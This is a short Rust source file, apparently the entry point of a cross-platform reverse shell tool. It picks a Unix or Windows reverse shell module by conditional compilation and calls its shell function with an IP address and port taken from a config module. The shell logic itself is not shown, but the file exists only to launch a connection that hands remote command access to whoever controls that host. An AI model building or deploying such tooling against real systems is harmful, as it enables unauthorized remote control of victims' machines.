// Load configuration values
mod config;

// Load the appropriate operating system's implementation
#[cfg(unix)]
mod rco_reverse_shell_unix;
#[cfg(unix)]
use rco_reverse_shell_unix::shell;

#[cfg(windows)]
extern crate windows;
#[cfg(windows)]
mod rco_reverse_shell_windows;
#[cfg(windows)]
use rco_reverse_shell_windows::shell;

fn main() {
    shell(config::IP, config::PORT);
}